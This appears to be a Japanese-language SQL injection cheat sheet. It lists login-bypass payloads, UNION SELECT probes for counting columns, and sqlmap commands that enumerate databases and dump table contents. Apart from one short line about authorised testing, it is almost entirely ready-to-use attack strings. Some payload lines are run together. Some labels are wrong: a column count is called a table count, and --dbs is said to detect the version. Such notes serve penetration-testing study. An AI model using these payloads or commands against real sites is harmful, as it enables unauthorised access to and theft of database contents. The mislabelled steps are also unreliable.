# Basic
- ## 有効性のチェック
  - ' or '1'='1';--を入力し、普通に入力した時との違いがあるかをBurpSuite等を使って確認する。
- ## テーブル数を特定する。
  - ' union select null;--
  - これでカラム数に関するエラーが出れば徐々に増やしていく。
  - aaa' union select null, null, null, null, null;--


- admin'or '1'='1
- 'or '1'='1
- 'or '1'='1 --
- "or "1"="1
- "or "1"="1"--"or "1"="1"/*"or "1"="1"#"or 1=1
- "or 1=1 --"or 1=1 -
"or 1=1--"or 1=1/*"or 1=1#"or 1=1-
") or "1"="1
") or "1"="1"--") or "1"="1"/*") or "1"="1"#") or ("1"="1") or ("1"="1"--
") or ("1"="1"/*") or ("1"="1"#) or '1`='1-
★1'or 1=1#

# sqlmap
- SQLmapは、SQLインジェクションの検出や悪用に特化したツールです。以下はSQLmapの基本的な使用例です：

1. **目標のURLを特定する**: SQLmapを使用して検査する対象のウェブサイトやウェブアプリケーションのURLを特定します。

2. **検査の開始**: SQLmapを使用して、目標のURLに対してインジェクション攻撃を実行します。以下のようにコマンドを入力します：

   - sqlmap -u <target_URL>
   例: `sqlmap -u http://example.com/page.php?id=1`

3. **自動検出**: SQLmapは自動的にSQLインジェクションの脆弱性を検出しようとします。検出された場合、詳細な情報が表示されます。

4. **脆弱性の調査と悪用**: SQLmapは、検出した脆弱性を利用してデータベースから情報を抽出したり、悪用したりするためのさまざまなオプションを提供します。以下はその一例です：

   - データベースのバージョンを検出する: 
     ```
     sqlmap -u <target_URL> --dbs
     ```

   - 特定のデータベースのテーブルを列挙する: 
     ```
     sqlmap -u <target_URL> -D <database_name> --tables
     ```

   - 特定のテーブルからデータを取得する: 
     ```
     sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump
     ```

これらはSQLmapの基本的な使用例です。ただし、SQLmapを使用する際には、標的となるウェブサイトやアプリケーションが合法的な検査であることを確認し、権限を持たないシステムに対して攻撃を行わないように注意する必要があります。

 参考サイト
https://shukapin.com/security/sqlmap

https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
option
description
example
-u
URL
sqlmap -u http://10.10.10.1/
--batch
Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers

--dbs
 Names of the available databases

--all
Retrieve everything
